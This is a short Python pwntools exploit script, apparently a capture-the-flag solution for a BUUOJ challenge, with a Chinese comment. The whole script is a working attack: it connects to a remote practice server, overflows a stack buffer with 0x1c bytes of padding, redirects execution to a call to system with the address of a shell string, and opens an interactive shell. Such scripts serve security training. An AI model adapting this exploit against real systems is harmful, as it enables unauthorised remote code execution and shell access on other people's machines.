from pwn import *

p = remote('node4.buuoj.cn', 27168)
context(os= 'linux', arch='i386')
sh_addr = 0x8048670
# 记住哦，这个call_system和参数之间是不需要一个假的返回地址的哦。这是这题的关键点
call_system = 0x8048529

payload = b'a'*(0x18+4) + p32(call_system) + p32(sh_addr)
p.send(payload)
p.interactive()